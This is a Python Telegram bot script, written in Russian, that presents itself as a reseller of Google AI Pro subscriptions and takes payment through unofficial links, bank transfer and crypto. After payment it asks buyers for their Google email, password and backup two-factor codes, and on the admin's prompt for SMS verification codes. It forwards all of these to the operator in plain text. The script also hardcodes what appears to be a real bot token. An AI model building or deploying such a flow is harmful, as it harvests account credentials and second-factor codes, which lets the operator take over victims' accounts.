import telebot
from telebot import types

# --- ⚙️ НАСТРОЙКИ БОТА ---
TOKEN = '8748113253:AAHp05rxnNdHGVFAvCcTU0hc7Yks0UUzSPk'
ADMIN_ID = 6305773261  # Твой личный ID
SUPPORT_LINK = 'https://t.me/ТВОЙ_ЛОГИН'

# 🎥 ID ВИДЕО
VIDEO_ABOUT = 'СЮДА_ID_ВИДЕО_О_ПОДПИСКЕ'
VIDEO_CODES = 'СЮДА_ID_ВИДЕО_КАК_НАЙТИ_КОДЫ'

bot = telebot.TeleBot(TOKEN)
user_data = {}

# --- 💼 БАЗА ПРОМОКОДОВ (ДЛЯ БЛОГЕРОВ) ---
PROMO_DB = {
    'UZB_BLOG': {'discount': 500, 'region': 'UZ', 'owner': 'Блогер Узбекистан'},
    'RU_BLOG': {'discount': 500, 'region': 'RU', 'owner': 'Блогер Россия'},
    'IT_MINSK': {'discount': 700, 'region': 'BY', 'owner': 'Блогер Беларусь'},
    'VITALIY': {'discount': 500, 'region': 'ALL', 'owner': 'Виталий'}
}

# --- 🎛 КЛАВИАТУРЫ ---
def main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛒 Купить подписку", callback_data="buy_menu"),
        types.InlineKeyboardButton("ℹ️ О подписке", callback_data="about_sub"),
        types.InlineKeyboardButton("📜 Правила и Поддержка", callback_data="rules_support")
    )
    return markup

def back_keyboard(callback_data="start"):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data=callback_data))
    return markup

# --- 🚀 1. ГЛАВНОЕ МЕНЮ ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    bot.clear_step_handler_by_chat_id(chat_id)
    user_data[chat_id] = {'price': 4000, 'promo_applied': False, 'region': 'ALL', 'promo_name': None}
    
    text = (
        "Добро пожаловать! Ваша безопасность — это наш приоритет 🛡️\n\n"
        "Этот бот — твой прямой доступ к официальной премиум-подписке **Google AI Pro (Gemini Pro + 2 ТБ хранилища)**.\n\n"
        "Самая мощная нейросеть от Google, которая решает сложные задачи, пишет код и генерирует контент на профессиональном уровне.\n\n"
        "Выбери нужный раздел ниже 👇"
    )
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=main_keyboard())

# --- 🔄 ОБРАБОТКА ВСЕХ КНОПОК ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    bot.clear_step_handler_by_chat_id(chat_id) 

    if chat_id not in user_data:
        user_data[chat_id] = {'price': 4000, 'promo_applied': False, 'region': 'ALL', 'promo_name': None}

    if call.data == "start":
        bot.delete_message(chat_id, call.message.message_id)
        send_welcome(call.message)

    # ℹ️ О подписке
    elif call.data == "about_sub":
        text = (
            "**Google AI Pro** открывает доступ к передовым технологиям на 12 месяцев:\n\n"
            "🧠 **Gemini Advanced:** Топовая модель для сложных задач.\n"
            "🎥 **Veo:** Профессиональная генерация видео.\n"
            "🎨 **Nano Banana 2:** Создание и редактирование шедевральных изображений.\n"
            "☁️ **Google One (2 ТБ):** Огромное защищенное облако для ваших данных."
        )
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🎬 Смотреть видео-обзор", callback_data="send_video_about"),
            types.InlineKeyboardButton("🔙 Назад", callback_data="start")
        )
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

    elif call.data == "send_video_about":
        try:
            bot.send_video(chat_id, VIDEO_ABOUT, caption="Краткий обзор возможностей Google AI Pro.")
        except:
            bot.send_message(chat_id, "Видео скоро будет загружено!")

    # 📜 Правила и Поддержка
    elif call.data == "rules_support":
        text = (
            "⚠️ **ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ ПЕРЕД ПОКУПКОЙ:**\n\n"
            "1. **Гарантия:** Мы гарантируем официальную активацию подписки.\n"
            "2. **Личные данные:** Если вы выбираете активацию на СВОЙ аккаунт, вы ОБЯЗАНЫ предоставить 100% верный пароль и резервные коды.\n"
            "3. 🚫 **ШТРАФ:** Если вы скинули неверные данные, мы не смогли войти, а вы пропали — оплата НЕ ВОЗВРАЩАЕТСЯ.\n"
            "4. Боитесь давать данные? Выбирайте опцию «Новый аккаунт» после оплаты.\n\n"
            "Остались вопросы? Пишите в поддержку."
        )
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("👨‍💻 Написать в поддержку", url=SUPPORT_LINK),
            types.InlineKeyboardButton("🔙 Назад", callback_data="start")
        )
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', disable_web_page_preview=True, reply_markup=markup)

    # 🛒 Меню покупки
    elif call.data == "buy_menu":
        price = user_data[chat_id]['price']
        text = f"💳 **Оформление подписки Google AI Pro.**\n\nК оплате: **{price} руб.**\n"
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton(f"✅ Перейти к оплате ({price} руб.)", callback_data="pay_step"))
        if not user_data[chat_id]['promo_applied']:
            markup.add(types.InlineKeyboardButton("🎁 Ввести промокод от блогера", callback_data="ask_promo"))
        markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="start"))
        
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

    # 🎁 Промокод
    elif call.data == "ask_promo":
        bot.edit_message_text("Напишите ваш промокод прямо в этот чат 👇", chat_id, call.message.message_id, reply_markup=back_keyboard("buy_menu"))
        bot.register_next_step_handler(call.message, process_promo)

    # 💳 Оплата (НОВАЯ СИСТЕМА КНОПОК)
    elif call.data == "pay_step":
        price = user_data[chat_id]['price']
        region = user_data[chat_id]['region']
        
        text = f"💳 **Выберите удобный способ оплаты на {price} руб.:**\n\n*Выберите вашу страну или крипту:*"
        markup = types.InlineKeyboardMarkup(row_width=1)
        
        btn_rf = types.InlineKeyboardButton("🇷🇺 Карты РФ / СБП", url="https://payok.io/ПУСТЫШКА")
        btn_world = types.InlineKeyboardButton("🌍 Visa / Mastercard (Мир)", url="https://boosty.to/ПУСТЫШКА")
        btn_kaspi = types.InlineKeyboardButton("🇰🇿 Kaspi Bank (Казахстан)", callback_data="show_kaspi")
        btn_crypto = types.InlineKeyboardButton("💎 Криптовалюта (USDT)", url="https://t.me/CryptoBot?start=ПУСТЫШКА")
        
        if region == 'RU':
            markup.add(btn_rf, btn_world, btn_kaspi, btn_crypto)
        elif region == 'UZ':
            markup.add(btn_world, btn_crypto, btn_rf, btn_kaspi)
        else:
            markup.add(btn_rf, btn_world, btn_kaspi, btn_crypto)
            
        markup.add(types.InlineKeyboardButton("📸 Я ОПЛАТИЛ (Отправить чек)", callback_data="wait_for_receipt"))
        markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="buy_menu"))
        
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

    # Показать реквизиты Kaspi
    elif call.data == "show_kaspi":
        price_kzt = int(user_data[chat_id]['price'] * 4.8)
        bot.send_message(chat_id, f"🇰🇿 **Переведите {price_kzt} тенге на Kaspi:**\n\nНомер: `+7 707 XXX XX XX`\nПолучатель: Давронбек Б.\n\nПосле перевода нажмите кнопку 'Я ОПЛАТИЛ' в меню выше.", parse_mode='Markdown')

    # Ожидание чека
    elif call.data == "wait_for_receipt":
        bot.send_message(chat_id, "🧾 Отправьте фотографию чека или скриншот об оплате прямо в этот чат:")
        bot.register_next_step_handler(call.message, handle_receipt)

    # --- 👨‍⚖️ КНОПКИ АДМИНА (ПРОВЕРКА ЧЕКА) ---
    elif call.data.startswith("confirm_pay_"):
        client_id = int(call.data.split("_")[2])
        bot.edit_message_text("✅ Чек подтвержден. Клиент выбирает тип аккаунта.", chat_id, call.message.message_id)
        ask_account_type(client_id)

    elif call.data.startswith("reject_pay_"):
        client_id = int(call.data.split("_")[2])
        msg = bot.send_message(chat_id, "❌ Чек отклонен. Напиши причину для клиента (например: 'Деньги не поступили'):")
        bot.register_next_step_handler(msg, send_reject_reason, client_id)

    # --- 🔐 ВЫБОР ТИПА АККАУНТА ---
    elif call.data == "type_old":
        text = (
            "Вы выбрали активацию на **Собственный аккаунт**.\n\n"
            "Отправьте нам одним сообщением:\n"
            "1. Адрес эл. почты (Логин)\n"
            "2. Пароль\n"
            "3. Два 8-значных резервных кода\n\n"
            f"В случае проблем пишите: {SUPPORT_LINK}"
        )
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("🎥 Как найти резервные коды", callback_data="send_video_codes"))
        markup.add(types.InlineKeyboardButton("🔙 Изменить тип аккаунта", callback_data="back_to_acc_type"))
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', disable_web_page_preview=True, reply_markup=markup)
        bot.register_next_step_handler(call.message, receive_client_data, "Собственный")

    elif call.data == "type_new":
        text = (
            "Вы выбрали **Создание нового аккаунта**.\n\n"
            "Мы не требуем резервных кодов. Для создания профиля отправьте:\n"
            "1. Ваш номер телефона\n"
            "2. Резервный адрес эл. почты"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Изменить тип аккаунта", callback_data="back_to_acc_type"))
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        bot.register_next_step_handler(call.message, receive_client_data, "Новый")

    elif call.data == "back_to_acc_type":
        ask_account_type(chat_id, edit_msg=call.message)

    elif call.data == "send_video_codes":
        try:
            bot.send_video(chat_id, VIDEO_CODES, caption="Инструкция: где найти резервные коды.")
        except:
            bot.send_message(chat_id, "Видео загружается. Найдите 'Резервные коды' в разделе 'Безопасность'.")
        bot.register_next_step_handler(call.message, receive_client_data, "Собственный")

    # --- 📲 КНОПКИ АДМИНА ПРО СМС ---
    elif call.data.startswith("smsyes_"):
        client_id = int(call.data.split("_")[1])
        bot.send_message(client_id, "⚠️ **Внимание!** Сейчас на ваш номер придет СМС с кодом от Google. Напишите код прямо в этот чат!", parse_mode='Markdown')
        bot.send_message(chat_id, f"✅ Ты запросил СМС у клиента {client_id}. Ждем...")
        bot.register_next_step_handler(call.message, forward_sms_to_admin, ADMIN_ID) 

    elif call.data.startswith("smsno_"):
        client_id = int(call.data.split("_")[1])
        bot.send_message(client_id, "ℹ️ СМС на ваш номер не потребуется. Ожидайте готовности!")
        bot.send_message(chat_id, "✅ Ты выбрал 'СМС не придет'. Клиент успокоен.")

    # --- 🏁 ФИНАЛЬНАЯ ВЫДАЧА АККАУНТА ---
    elif call.data.startswith("finish_acc_"):
        client_id = int(call.data.split("_")[2])
        msg = bot.send_message(chat_id, "📝 Отправь мне логин и пароль, которые нужно выдать клиенту:")
        bot.register_next_step_handler(msg, send_final_account, client_id)

# --- ФУНКЦИИ ЛОГИКИ ---
def process_promo(message):
    chat_id = message.chat.id
    promo = message.text.strip().upper()
    
    if promo in PROMO_DB:
        discount = PROMO_DB[promo]['discount']
        user_data[chat_id]['price'] -= discount
        user_data[chat_id]['promo_applied'] = True
        user_data[chat_id]['region'] = PROMO_DB[promo]['region']
        user_data[chat_id]['promo_name'] = promo
        
        bot.send_message(chat_id, f"🎉 Промокод найден! Скидка {discount} руб. применена.", reply_markup=back_keyboard("buy_menu"))
        bot.send_message(ADMIN_ID, f"👀 Клиент ввел промокод: {promo} (Блогер: {PROMO_DB[promo]['owner']})")
    else:
        bot.send_message(chat_id, "❌ Промокод не найден или недействителен.", reply_markup=back_keyboard("buy_menu"))

def handle_receipt(message):
    chat_id = message.chat.id
    promo_used = user_data[chat_id]['promo_name']
    promo_text = f"\n🎁 Использован промо: {promo_used}" if promo_used else "\n❌ Без промокода"
    
    if message.photo or message.document:
        bot.send_message(chat_id, "⏳ Чек отправлен на проверку. Ожидайте.")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f"confirm_pay_{chat_id}"),
            types.InlineKeyboardButton("❌ Отклонить чек", callback_data=f"reject_pay_{chat_id}")
        )
        caption = f"💰 ЧЕК ОТ КЛИЕНТА: {chat_id}{promo_text}"
        
        if message.photo:
            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=caption, reply_markup=markup)
        else:
            bot.send_document(ADMIN_ID, message.document.file_id, caption=caption, reply_markup=markup)
    else:
        bot.send_message(chat_id, "Пожалуйста, отправьте именно картинку или файл чека.")
        bot.register_next_step_handler(message, handle_receipt)

def send_reject_reason(message, client_id):
    bot.send_message(client_id, f"❌ Ошибка проверки оплаты.\nПричина: {message.text}\n\nПожалуйста, проверьте перевод или напишите в поддержку.")
    bot.send_message(ADMIN_ID, "Сообщение об отказе отправлено клиенту.")

def ask_account_type(chat_id, edit_msg=None):
    text = (
        "🎉 Оплата успешно подтверждена! Заказ взят в работу.\n\n"
        "⚠️ **ВНИМАНИЕ: Не закрывайте это окно и выберите тип подписки, чтобы мы начали активацию!**"
    )
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("👤 На собственный аккаунт", callback_data="type_old"),
        types.InlineKeyboardButton("🆕 Создать новый аккаунт", callback_data="type_new")
    )
    if edit_msg:
        bot.edit_message_text(text, chat_id, edit_msg.message_id, parse_mode='Markdown', reply_markup=markup)
    else:
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

def receive_client_data(message, acc_type):
    client_id = message.chat.id
    bot.send_message(client_id, "✅ Данные получены! Идет активация подписки. Ожидайте дальнейших инструкций.")
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    if acc_type == "Новый":
        markup.add(
            types.InlineKeyboardButton("📲 СМС придет", callback_data=f"smsyes_{client_id}"),
            types.InlineKeyboardButton("🔇 СМС НЕ придет", callback_data=f"smsno_{client_id}")
        )
    markup.add(types.InlineKeyboardButton("🏁 ВЫДАТЬ ГОТОВЫЙ АККАУНТ", callback_data=f"finish_acc_{client_id}"))

    bot.send_message(ADMIN_ID, f"🔥 НОВЫЙ ЗАКАЗ!\nТип: {acc_type}\nКлиент ID: {client_id}\n\nДанные:\n{message.text}", reply_markup=markup)

def forward_sms_to_admin(message, admin_id):
    bot.send_message(admin_id, f"📩 СМС код от клиента {message.chat.id}:\n{message.text}")
    bot.send_message(message.chat.id, "Код принят, активируем...")

def send_final_account(message, client_id):
    bot.send_message(client_id, f"🎉 **Ваша подписка успешно активирована!**\n\nВаши данные для входа:\n{message.text}\n\nСпасибо, что выбрали нас!", parse_mode='Markdown')
    bot.send_message(ADMIN_ID, "✅ Аккаунт успешно выдан клиенту!")

# --- 🚀 ЗАПУСК БОТА ---
print("Бот успешно запущен! Ожидание сообщений...")
try:
    bot.infinity_polling(timeout=90, long_polling_timeout=50)
except Exception as e:
    print(f"Ошибка интернета: {e}")
